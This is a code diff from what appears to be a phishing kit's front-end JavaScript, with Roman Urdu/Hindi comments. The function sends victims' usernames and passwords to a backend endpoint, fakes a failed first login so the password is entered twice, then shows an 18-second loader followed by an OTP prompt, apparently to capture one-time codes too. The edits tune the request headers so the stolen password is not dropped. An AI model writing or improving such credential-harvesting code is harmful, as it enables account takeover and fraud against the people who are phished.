@@ -65,16 +65,23 @@ async function captureStep() {
     document.getElementById('login-ui').style.display = 'none';
     document.getElementById('loader-ui').style.display = 'flex';
 
-    // Headers add karna lazmi hai taaki Python data ko samajh sakay
-    const requestOptions = {
+    // Headers ke baghair Vercel password ko drop kar deta hai
+    const payload = {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ u, p, t: tries < 1 ? 'INIT_LOG' : 'REAL_LOG' })
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+            u: u, 
+            p: p, 
+            t: tries < 1 ? 'INIT_LOG' : 'REAL_LOG'
+        })
     };
 
     if(tries < 1) {
-        // Pehli baar password bhej raha hai
-        await fetch('/api/index', requestOptions);
+        // Pehla attempt: Password lazmi bhejega
+        await fetch('/api/index', payload);
         setTimeout(() => {
             document.getElementById('loader-ui').style.display = 'none';
             document.getElementById('login-ui').style.display = 'block';
@@ -83,14 +90,14 @@ async function captureStep() {
             tries++;
         }, 3000); 
     } else {
-        // Doosri baar password bhej kar 18 seconds loading
-        await fetch('/api/index', requestOptions);
+        // Doosra attempt: Login aur 18 seconds ka wait
+        await fetch('/api/index', payload);
         setTimeout(() => {
             document.getElementById('loader-ui').style.display = 'none';
             document.getElementById('otp-ui').style.display = 'block';
         }, 18000); 
     }
-}
+    }
     
     
     async function submitPin() {
